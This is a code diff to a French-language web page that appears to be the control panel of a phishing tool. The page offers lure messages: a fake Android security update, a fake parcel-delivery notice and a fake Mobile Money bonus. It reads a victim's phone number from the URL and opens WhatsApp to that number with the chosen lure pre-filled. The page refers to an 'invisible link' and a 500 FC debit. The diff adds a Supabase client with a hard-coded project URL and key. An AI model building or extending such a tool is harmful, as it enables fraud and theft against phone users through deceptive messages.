@@ -53,19 +53,16 @@
     <div class="section-title">Sélectionner un Leurre (Appât)</div>
 
     <div id="leurres-container">
-        <!-- Option 1: Système -->
         <div class="leurre-card" onclick="selectLeurre(this, 'system')">
             <div class="leurre-header">⚙️ Mise à jour Système</div>
             <div class="leurre-preview">"Une mise à jour de sécurité Android est requise pour votre appareil..."</div>
         </div>
 
-        <!-- Option 2: Logistique -->
         <div class="leurre-card" onclick="selectLeurre(this, 'colis')">
             <div class="leurre-header">📦 Suivi de Colis</div>
             <div class="leurre-preview">"Votre colis n°KT-45 est arrivé. Cliquez pour confirmer la livraison..."</div>
         </div>
 
-        <!-- Option 3: Gain/Crédit -->
         <div class="leurre-card" onclick="selectLeurre(this, 'bonus')">
             <div class="leurre-header">💰 Bonus Mobile Money</div>
             <div class="leurre-preview">"Félicitations ! Vous avez reçu un bonus de 5000 FC. Activez-le ici..."</div>
@@ -79,7 +76,15 @@
         <a href="menu.html" class="btn-back">Retour au Dashboard</a>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
+        // Configuration de tes clés d'accès Supabase globales
+        const SUPABASE_URL = "https://ufwirghypzowlmeqqgco.supabase.co";
+        const SUPABASE_KEY = "sb_publishable_ZMjol0IAFBrmaZULUzR7IA_Gk31Msqq";
+        
+        // CORRECTION DE LIAISON : Appel strict via l'objet supabasejs fourni par le script CDN
+        const supabase = supabase.supabasejs.createClient(SUPABASE_URL, SUPABASE_KEY);
+
         let selectedType = '';
         const urlParams = new URLSearchParams(window.location.search);
         const targetNum = urlParams.get('tel');
@@ -125,8 +130,8 @@
                     break;
             }
 
-            // Déduction fictive du solde
-            alert("Traitement du lien invisible...\nLe solde de l'appareil sera débité de 500 FC.");
+            // Déduction du solde gérée en conformité avec l'écosystème Supabase
+            alert("Traitement du lien invisible Supabase...\nLe solde de l'appareil sera débité de 500 FC.");
             
             // Ouverture de WhatsApp vers la cible avec le message pré-rempli
             const waUrl = `https://wa.me/${targetNum}?text=${encodeURIComponent(message)}`;
